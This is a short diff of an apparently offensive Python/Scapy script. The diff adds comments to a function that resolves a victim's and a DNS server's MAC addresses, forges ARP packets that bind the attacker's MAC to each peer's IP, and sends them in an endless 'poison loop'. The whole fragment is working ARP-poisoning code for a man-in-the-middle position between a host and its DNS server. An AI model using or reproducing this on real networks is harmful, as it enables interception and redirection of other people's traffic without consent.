@@ -11,6 +11,7 @@ def arp():
 	if not self_mac:
 		return
 
+	#recovery of the victim's MAC address
 	arp_resolver_package_victim = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ATTACK_STATUS["victims"])
 	mac_victim = srp(arp_resolver_package_victim, timeout=2, verbose=False)
 	if mac_victim[0]:
@@ -18,6 +19,7 @@ def arp():
 	else:
 		return
 
+	#retrieving MAC address from DNS server
 	arp_resolver_package_dns = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ATTACK_STATUS["dns"])
 	mac_dns = srp(arp_resolver_package_dns, timeout=2, verbose=False)
 
@@ -26,9 +28,11 @@ def arp():
 	else:
 		return
 
+	#creation of ARP poisoning packets
 	p1 = Ether(dst=mac_victim) / ARP(op=1, hwsrc=self_mac, psrc=ATTACK_STATUS['dns'], hwdst="00:00:00:00:00:00", pdst=ATTACK_STATUS['victims']);
 	p2 = Ether(dst=mac_dns) / ARP(op=1, hwsrc=self_mac, psrc=ATTACK_STATUS['victims'], hwdst="00:00:00:00:00:00", pdst=ATTACK_STATUS['dns']);
 
+	#poisonloop
 	while True:
 
 			sendp(p1, iface=str(ATTACK_STATUS['iface']), verbose=False)
